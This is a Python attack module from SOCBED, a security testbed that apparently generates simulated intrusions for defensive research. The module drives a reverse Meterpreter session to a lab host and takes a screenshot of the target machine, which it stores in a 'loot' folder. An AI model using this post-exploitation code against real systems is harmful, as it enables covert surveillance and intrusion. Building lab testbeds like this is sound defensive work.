# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time

from attacks import AttackOptions, Attack, AttackInfo
from attacks.reverseconnectionhandler import ReverseConnectionHandler


class TakeScreenshotAttackOptions(AttackOptions):
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"

    def _set_defaults(self):
        self.lhost = "172.18.0.3"
        self.lport = "80"


class TakeScreenshotAttack(Attack):
    info = AttackInfo(
        name="c2_take_screenshot",
        description="Takes a screenshot on target host")
    options_class = TakeScreenshotAttackOptions
    handler = None
    screenshot_file = "/root/screenshot.jpeg"

    def run(self):
        self._prepare_attack()
        with self.check_printed("Screenshot saved to"):
            with self.wrap_ssh_exceptions():
                self._start_handler()
                self._handle_output()

    def _prepare_attack(self):
        self.exec_command_on_target("cd /root; mkdir -p loot; cd loot; rm -f screenshot.jpeg")

    def _start_handler(self):
        self.handler = ReverseConnectionHandler(self.ssh_client, self.options.lhost, self.options.lport)
        self.handler.start()

    def _handle_output(self):
        for line in self.handler.stdout:
            self._respond(line)
            self.print(line.strip("\n"))

    def _respond(self, line):
        if "Meterpreter session 1 opened" in line:
            time.sleep(2)
            self._collect_files()
        elif ("Backgrounding session " in line) or \
                ("Exploit completed, but no session was created" in line):
            self.handler.shutdown()

    def _collect_files(self):
        self.ssh_client.write_lines(self.handler.stdin, [
            "screenshot -p {file}".format(file=self.screenshot_file),
            "background"])
